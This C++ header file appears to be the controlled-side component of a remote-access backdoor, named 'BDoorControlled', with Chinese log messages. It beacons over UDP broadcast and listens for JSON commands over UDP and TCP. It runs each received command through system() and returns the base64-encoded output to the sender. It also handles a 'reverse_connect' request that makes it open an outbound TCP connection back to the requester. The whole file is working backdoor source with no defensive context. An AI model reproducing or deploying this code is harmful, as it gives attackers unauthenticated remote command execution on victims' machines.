#pragma once
#include <protocol/BDoorProtocol.h>
#include <fstream>
#include<vector>
#include <other\tools.h>
#define CMD_RETURN_TXT_NAME "cmd_return.txt"
class Command {
private:
	const string name = "command";
public:
	virtual int Func() = 0;
	virtual string GetName() = 0;
};
class RemoteCommand {
private:
	const string name;
public:
	virtual int Func(string command) = 0;
	virtual string GetName() = 0;
};
int run_cmd_with_txt(string cmd_command, string& mess) {

	/*平替方案*/

	fstream fst;
	fst.open(CMD_RETURN_TXT_NAME, ios::trunc | ios::out);
	if (!fst.is_open()) {

		cout << "文件打开失败" << endl;
		return 0;

	}
	else {

		cout << "文件打开成功" << endl;

	}
	fst.close();

	cmd_command += string(" >> ") + CMD_RETURN_TXT_NAME;
	system(cmd_command.data());

	ifstream ifs;
	ifs.open(CMD_RETURN_TXT_NAME, ios::in);
	string remess = "\n";
	string buf;
	while (getline(ifs, buf)) {

		remess += buf + string("\n");

	}
	mess = remess;
	ifs.close();
	if (remove(string(CMD_RETURN_TXT_NAME).data()) == 0) {

		cout << "成功删除文件" << endl;

	}
	else {

		cout << "无法删除文件" << endl;
		return 0;

	}

	return 1;

}
class CallHost : public Command{
private:
	const string name = "callhost";
	int call_frequency = 250;
public:
	int Func() override {
		cout << "CallHost线程启动" << endl;
		SOCKET call_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		sockaddr_in call_addr;
		call_addr.sin_family = AF_INET;
		call_addr.sin_port = htons(GROUP_PORT);
		call_addr.sin_addr.s_addr = inet_addr(GROUP_IP);
		bindport(call_socket, (const sockaddr*)&call_addr, sizeof(call_addr));
		bool bopt = true;
		setsockopt(call_socket, SOL_SOCKET, SO_BROADCAST, (char*)&bopt, sizeof(bopt));
		string sendmess = string(EMPTYCHAR);
		while (true) {	
			sendto(call_socket, sendmess.data(), sizeof(sendmess.data()), 0, (const sockaddr*)&call_addr, sizeof(call_addr));
			Sleep(call_frequency);
		}
	}
	string GetName()override { return name; }
};
class UDP :public Command {
private:
	class Cmd :public RemoteCommand {
	private:
		const string name = "cmd";
		SOCKET &udp_socket;
		sockaddr_in &udp_addr;
	public:
		Cmd(SOCKET& udp_socket_a, sockaddr_in& udp_addr_a) :udp_socket(udp_socket_a), udp_addr(udp_addr_a) {

		}
		int Func(string command) override {
			json command_json = json::parse(command);
			if (command_json[COMMANDNAME] == name) {
				cout << "cmd调用" << endl;
				string returnmess;
				run_cmd_with_txt(command_json[CONTENT], returnmess);
				udp::SendtoMess(udp_socket, udp_addr, FormatJson(name,EncodeStrInBase64(returnmess)).dump());
				cout << returnmess << endl;
				return 1;
			}
			cout << command_json[COMMANDNAME] << endl;
			return 0;
		}
		string GetName()override { return name; }
	};
	const string name = "udp";
	SOCKET udp_socket;
	sockaddr_in udp_addr, sender_addr;
	Cmd cmd = Cmd(udp_socket,sender_addr);
	vector<RemoteCommand*> remote_command_list = { &cmd };
public:
	int Func()override {
		cout << "UDP线程启动" << endl;
		udp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		udp_addr.sin_family = AF_INET;
		udp_addr.sin_port = htons(UDP_PORT);
		udp_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(udp_socket, (const sockaddr*)&udp_addr, sizeof(udp_addr));
		while (true) {
			string recvmess;
			cout << "等待接收" << endl;
			udp::RecvfromMess(udp_socket, sender_addr, recvmess);
			cout << inet_ntoa(sender_addr.sin_addr) << "/UDP>" << recvmess << endl;
			for (int i = 0; i < remote_command_list.size(); i++) {
				remote_command_list[i]->Func(recvmess);
			}
		}
	}
	string GetName()override { return name; }
};
class TCP :public Command {
private:
	class Cmd :public RemoteCommand {
	private:
		const string name = "cmd";
		SOCKET &connect_socket;
	public:
		Cmd(SOCKET& connect_socket_a) :connect_socket(connect_socket_a) {

		}
		int Func(string command)override {
			json command_json = json::parse(DecodeStrInBase64(command));	
			if (command_json[COMMANDNAME] == name) {
				cout << "cmd调用" << endl;
				string returnmess;
				run_cmd_with_txt(command_json[CONTENT], returnmess);
				string sendmess = FormatJson(name, EncodeStrInBase64( returnmess)).dump();
				tcp::SendBase64(connect_socket, sendmess);
				cout << returnmess << endl;
				return 1;
			}
			return 0;
		}
		string GetName()override { return name; }
	};
	const string name = "tcp";
	SOCKET connect_socket;
	Cmd cmd = Cmd(connect_socket);
	vector<RemoteCommand*> remote_command_list = { &cmd };
public:
	int Func() override{
		cout << "TCP线程启动" << endl;
		SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		sockaddr_in listen_addr;
		listen_addr.sin_family = AF_INET;
		listen_addr.sin_port = htons(TCP_PORT);
		listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(listen_socket, (const sockaddr*)&listen_addr, sizeof(listen_addr));
		thread(&TCP::ReverseConnect,this).detach();
		while (true) {
			listen(listen_socket,5);
			sockaddr_in connect_addr;
			int connect_addr_len = sizeof(connect_addr);
			connect_socket = accept(listen_socket, (sockaddr*)&connect_addr, &connect_addr_len);
			cout << inet_ntoa(connect_addr.sin_addr) << endl;
			string recvmess;
			tcp::RecvMess(connect_socket, recvmess);
			cout << inet_ntoa(connect_addr.sin_addr) << "/TCP>" << recvmess << endl;
			for (int i = 0; i < remote_command_list.size(); i++) {
				remote_command_list[i]->Func(recvmess);
			}
		}
	}
	int ReverseConnect() {
		cout << "反向TCP线程启动" << endl;
		SOCKET reverse_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		sockaddr_in reverse_addr;
		reverse_addr.sin_family = AF_INET;
		reverse_addr.sin_port = htons(REVERSE_PORT);
		reverse_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(reverse_socket, (const sockaddr *)&reverse_addr, sizeof(reverse_addr));
		while (true) {
			sockaddr_in sender_addr;
			string recvmess;
			udp::RecvfromMess(reverse_socket, sender_addr, recvmess);
			cout << inet_ntoa(sender_addr.sin_addr) << ": 反向连接请求" << endl;
			json requestmess;
			requestmess.parse(recvmess);
			if (requestmess[COMMANDNAME] == name) {
				if (requestmess[CONTENT] == "reverse_connect") {
					connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
					sockaddr_in addr;
					addr.sin_family = AF_INET;
					addr.sin_port = htons(TCP_PORT);
					addr.sin_addr.s_addr = inet_addr(inet_ntoa(sender_addr.sin_addr));
					connect(connect_socket, (const sockaddr*)&addr, sizeof(addr));
					tcp::RecvMess(connect_socket, recvmess);
					cout << inet_ntoa(addr.sin_addr) << "/TCP>" << recvmess << endl;
					for (int i = 0; i < remote_command_list.size(); i++) {
						remote_command_list[i]->Func(recvmess);
					}
				}
			}
		}	
	}
	string GetName()override { return name; }
};
class BDoorControlled {
private:
	int wsa = WSAInit();
	CallHost call_host = CallHost();
	UDP udp = UDP();
	TCP tcp = TCP();
	vector <Command*> command_list = { &call_host,&udp ,&tcp};
public:
	BDoorControlled(){
		for (int i = 0; i < command_list.size(); i++) {
			thread t([=]() {
				command_list[std::ref(i)]->Func();
				});
			if (i == command_list.size() - 1) {t.join();}else { t.detach(); }
		}
	}
};